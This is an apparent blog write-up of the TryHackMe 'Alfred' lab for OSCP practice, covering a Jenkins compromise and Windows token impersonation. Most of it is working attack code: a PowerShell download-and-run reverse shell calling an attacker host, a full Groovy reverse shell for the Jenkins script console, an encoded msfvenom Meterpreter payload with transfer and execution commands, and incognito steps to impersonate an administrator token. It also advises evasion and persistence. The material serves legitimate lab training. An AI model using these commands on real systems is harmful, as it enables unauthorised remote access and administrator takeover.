---
date: '2025-02-02T00:07:56+05:30'
draft: false
title: 'Alfred: TryHackMe OSCP Preparation'
slug: alfred-thm
tags: ["tryhackme", "windows", "jenkins", "token-impersonation", "oscp"]
category: writeups
showtoc: true
summary: A detailed walkthrough of the Alfred room on TryHackMe, demonstrating Jenkins exploitation, shell upgrades, and Windows token impersonation
description: Learn Windows privilege escalation through token impersonation, Jenkins exploitation, and shell manipulation in this OSCP-style walkthrough
---

# Alfred: TryHackMe Walkthrough

## Initial Enumeration

### Nmap Scan Results
```bash
nmap -sV -Pn 10.10.209.46

PORT     STATE SERVICE    VERSION
80/tcp   open  http      Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http      Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Key findings:
- IIS web server on port 80
- RDP on port 3389
- Jenkins (Jetty) on port 8080

## Initial Access

### Jenkins Exploitation

Two methods for obtaining reverse shell:

1. **PowerShell Method**:
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

2. **Groovy Script Method** (Easier):
Navigate to `$rhost:8080/script` and execute:
```groovy
Thread.start {
    String host="lhost";
    int port=4444;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()){
        while(pi.available()>0)so.write(pi.read());
        while(pe.available()>0)so.write(pe.read());
        while(si.available()>0)po.write(si.read());
        so.flush();po.flush();
        Thread.sleep(50);
        try {p.exitValue();break;}catch (Exception e){}
    };
    p.destroy();s.close();
}
```

## Shell Upgrade

### Creating Meterpreter Shell
1. Generate payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```

2. Transfer to target:
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
```

3. Execute on target:
```powershell
powershell -c Start-Process "shell.exe"
```

## Privilege Escalation

### Token Impersonation

#### Theory
- **LSASS.exe**: Manages account token assignment
- **Access Tokens**:
  - Primary: Generated on user logon
  - Impersonation: Allows process to use another user's token

#### Token Impersonation Levels
1. SecurityAnonymous
2. SecurityIdentification
3. SecurityImpersonation
4. SecurityDelegation

### Exploitation Steps

1. Check current privileges:
```bash
whoami /priv
```

2. Load incognito in Meterpreter:
```bash
load incognito
```

3. List available tokens:
```bash
list_tokens -g
```

4. Impersonate administrator token:
```bash
impersonate_token "BUILTIN\Administrators"
```

5. Migrate to stable process:
```bash
ps | grep services.exe
migrate <PID>
```

## Best Practices

1. **Initial Access**
   - Verify Jenkins version
   - Test script execution
   - Maintain session stability

2. **Shell Management**
   - Upgrade shells when possible
   - Use encoded payloads
   - Maintain multiple access methods

3. **Privilege Escalation**
   - Document token privileges
   - Choose stable processes
   - Verify successful migration

## Tools Used

1. [Nishang](https://github.com/samratashok/nishang)
   - PowerShell scripts
   - Reverse shells
   - Enumeration tools

2. Metasploit Framework
   - Payload generation
   - Session handling
   - Token manipulation

## References

1. [Nishang GitHub Repository](https://github.com/samratashok/nishang)
2. [Windows Token Impersonation](https://attack.mitre.org/techniques/T1134/)
3. [Jenkins Security](https://www.jenkins.io/security/)
4. [Microsoft Access Tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
